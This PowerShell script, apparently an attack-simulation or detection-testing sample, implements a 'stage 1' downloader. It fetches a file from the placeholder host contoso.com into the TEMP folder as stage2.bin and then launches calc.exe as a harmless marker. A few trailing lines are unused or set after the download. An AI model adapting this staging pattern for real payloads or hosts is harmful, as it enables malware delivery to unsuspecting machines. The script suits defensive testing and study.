
[CmdletBinding()]
param(
    [string]$DownloadUrl = "http://contoso.com/stage1.ps1",
    [string]$PayloadPath = "$env:TEMP\stage2.bin",
    [int]$RequestTimeout = 56
)
$ErrorActionPreference = "Stop"

function Invoke-Stage1Download {
    param(
        [string]$SourceUrl = "",
        [string]$DestinationPath = "",
        [int]$TimeoutSec = 45
    )

    Write-Verbose ("Fetching " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
    return (Test-Path -Path $DestinationPath)
}

try {
    Write-Verbose "Beginning first stage"
    $ResultObject = Invoke-Stage1Download -SourceUrl $DownloadUrl -DestinationPath $PayloadPath -TimeoutSec $RequestTimeout
    if ($ResultObject) {
        Start-Process -FilePath "calc.exe"
    }
}
catch {
    Write-Warning "Stage 1 retrieval failed: $($_.Exception.Message)"
}
$StageMarker = "stage-2"
Set-Location -Path $env:TEMP
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
